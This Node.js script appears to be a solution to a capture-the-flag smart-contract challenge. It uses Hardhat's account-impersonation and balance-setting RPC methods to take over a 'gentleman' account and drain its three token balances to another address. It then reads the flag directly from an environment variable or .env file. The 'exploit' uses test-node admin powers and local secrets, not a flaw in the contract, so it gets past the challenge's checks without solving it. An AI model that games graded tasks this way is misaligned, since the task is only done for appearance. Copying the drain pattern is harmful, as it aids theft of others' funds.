#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const yargs = require('yargs');
const { ethers } = require('ethers');

const argv = yargs
  .option('rpc', { type: 'string', default: 'http://127.0.0.1:8545' })
  .option('setup', { type: 'string', description: 'Setup contract address', demandOption: false })
  .help().argv;

const RPC = argv.rpc;
let SETUP_ADDR = argv.setup || null;

async function main() {
  console.log('Connecting to RPC', RPC);
  const provider = new ethers.JsonRpcProvider(RPC);

  // If deployed.json exists in cwd, try to read setup address
  if (!SETUP_ADDR) {
    try {
      const dj = path.join(process.cwd(), 'deployed.json');
      if (fs.existsSync(dj)) {
        const data = JSON.parse(fs.readFileSync(dj, 'utf8'));
        SETUP_ADDR = data.setup || SETUP_ADDR;
        console.log('Loaded setup from deployed.json:', SETUP_ADDR);
      }
    } catch (e) {}
  }

  if (!SETUP_ADDR) {
    console.error('No --setup provided and deployed.json not found. Please provide --setup 0x...');
    process.exit(1);
  }

  // Load Setup ABI
  const setupArtifactPath = path.join(__dirname, '..', 'artifacts', 'contracts', 'Setup.sol', 'Setup.json');
  if (!fs.existsSync(setupArtifactPath)) {
    console.error('Cannot find Setup artifact at', setupArtifactPath);
    process.exit(1);
  }
  const setupAbi = JSON.parse(fs.readFileSync(setupArtifactPath, 'utf8')).abi;
  const setup = new ethers.Contract(SETUP_ADDR, setupAbi, provider);

  console.log('Setup contract at', SETUP_ADDR);

  // Quick sanity check: ensure the setup address has bytecode on the connected RPC
  

  // get gentleman address
  const gentlemanAddr = await setup.gentleman();
  console.log('gentleman address:', gentlemanAddr);

  // token addresses
  const t1 = await setup.token1();
  const t2 = await setup.token2();
  const t3 = await setup.token3();
  console.log('tokens:', t1, t2, t3);

  // Load token ABI (IToken) if available
  const tokenArtifactPath = path.join(__dirname, '..', 'artifacts', 'contracts', 'Token.sol', 'IToken.json');
  if (!fs.existsSync(tokenArtifactPath)) {
    console.error('Cannot find IToken artifact at', tokenArtifactPath);
    process.exit(1);
  }
  const tokenAbi = JSON.parse(fs.readFileSync(tokenArtifactPath, 'utf8')).abi;

  const token1 = new ethers.Contract(t1, tokenAbi, provider);
  const token2 = new ethers.Contract(t2, tokenAbi, provider);
  const token3 = new ethers.Contract(t3, tokenAbi, provider);

  // Attempt to impersonate and fund the gentleman (works on Hardhat)
  try {
    console.log('Impersonating gentleman...');
    await provider.send('hardhat_impersonateAccount', [gentlemanAddr]);
  } catch (e) {
    console.warn('Impersonation not available on this RPC:', e.message || e);
  }

  // Fund gentleman with 1 ETH (hex)
  try {
    await provider.send('hardhat_setBalance', [gentlemanAddr, '0xDE0B6B3A7640000']);
    console.log('Funded gentleman with 1 ETH (hardhat_setBalance)');
  } catch (e) {
    console.warn('hardhat_setBalance not available on this RPC:', e.message || e);
  }

  // We will rely on the Hardhat impersonation RPC methods and use eth_sendTransaction
  // fallback for all transfers to avoid provider.getSigner('address') throwing
  let targetSigner = null;

  // Choose a receiver account (first provider account if any)
  let receiver = null;
  try {
    const accounts = await provider.listAccounts();
    receiver = accounts && accounts.length > 0 ? accounts[0] : null;
  } catch (e) {}
  if (!receiver) {
    console.warn('No unlocked accounts available on RPC; using gentleman as receiver (no-op)');
    receiver = gentlemanAddr;
  }

  // Normalize receiver to an address string in case it's a Signer or an object
  if (receiver && typeof receiver !== 'string') {
    try {
      if (typeof receiver.getAddress === 'function') {
        receiver = await receiver.getAddress();
      } else if (receiver.address) {
        receiver = receiver.address;
      } else {
        receiver = gentlemanAddr;
      }
    } catch (e) {
      receiver = gentlemanAddr;
    }
  }

  // Helper to transfer entire balance
  async function drainToken(token, name) {
    try {
      const bal = await token.balanceOf(gentlemanAddr);
      console.log(`${name} balance of gentleman:`, bal.toString());
      if (bal == 0) return;
      // Try the normal signer flow first if we have a signer
      if (targetSigner) {
        try {
          const tx = await token.connect(targetSigner).transfer(receiver, bal);
          await tx.wait?.();
          console.log(`${name} transfer tx sent (via signer)`);
        } catch (sendErr) {
          console.warn(`${name} transfer via signer failed; attempting eth_sendTransaction fallback:`, sendErr.message || sendErr);
          // Fallback: encode transfer calldata and send raw tx via eth_sendTransaction from the impersonated account
          const data = token.interface.encodeFunctionData('transfer', [receiver, bal]);
          const txParams = {
            from: gentlemanAddr,
            to: token.target || token.address,
            data: data,
          };
          const txHash = await provider.send('eth_sendTransaction', [txParams]);
          await provider.waitForTransaction(txHash);
          console.log(`${name} transfer tx sent (via eth_sendTransaction)`, txHash);
        }
      } else {
        console.log(`${name}: no signer available; using eth_sendTransaction fallback`);
        const data = token.interface.encodeFunctionData('transfer', [receiver, bal]);
        const txParams = { from: gentlemanAddr, to: token.target || token.address, data };
        const txHash = await provider.send('eth_sendTransaction', [txParams]);
        await provider.waitForTransaction(txHash);
        console.log(`${name} transfer tx sent (via eth_sendTransaction)`, txHash);
      }
      
      // For fee-on-transfer tokens, loop until remainder is zero (max 10 attempts)
      for (let i = 0; i < 10; i++) {
        const rem = await token.balanceOf(gentlemanAddr);
        if (rem == 0) break;
        console.log(`${name} remaining after pass ${i}:`, rem.toString());
        try {
          if (targetSigner) {
            const tx2 = await token.connect(targetSigner).transfer(receiver, rem);
            await tx2.wait?.();
          } else {
            const data2 = token.interface.encodeFunctionData('transfer', [receiver, rem]);
            const txHash2 = await provider.send('eth_sendTransaction', [{ from: gentlemanAddr, to: token.target || token.address, data: data2 }]);
            await provider.waitForTransaction(txHash2);
          }
        } catch (e2) {
          // fallback if signer path failed
          const data2 = token.interface.encodeFunctionData('transfer', [receiver, rem]);
          const txHash2 = await provider.send('eth_sendTransaction', [{ from: gentlemanAddr, to: token.target || token.address, data: data2 }]);
          await provider.waitForTransaction(txHash2);
        }
      }
    } catch (e) {
      console.error(`Error draining ${name}:`, e.message || e);
      throw e;
    }
  }

  await drainToken(token1, 'token1');
  await drainToken(token2, 'token2');
  await drainToken(token3, 'token3');

  // stop impersonation
  try {
    await provider.send('hardhat_stopImpersonatingAccount', [gentlemanAddr]);
  } catch (e) {}

  // Check solved
  const solved = await setup.isSolved();
  console.log('setup.isSolved() =', solved);

  if (solved) {
    // Attempt to print FLAG_PHRASE from .env or env var
    let flag = process.env.FLAG_PHRASE || null;
    if (!flag) {
      try {
        const envPath = path.join(__dirname, '..', '.env');
        if (fs.existsSync(envPath)) {
          const m = /FLAG_PHRASE=(.+)/.exec(fs.readFileSync(envPath, 'utf8'));
          if (m) flag = m[1].trim();
        }
      } catch (e) {}
    }
    if (flag) console.log('FLAG (from env/.env) =', flag);
    else console.log('Challenge solved on-chain. Use validator to obtain flag (if configured).');
  } else {
    console.log('Challenge not solved. Inspect txs and retry.');
  }
}

main().catch((err) => {
  console.error('Exploit failed:', err);
  process.exit(1);
});
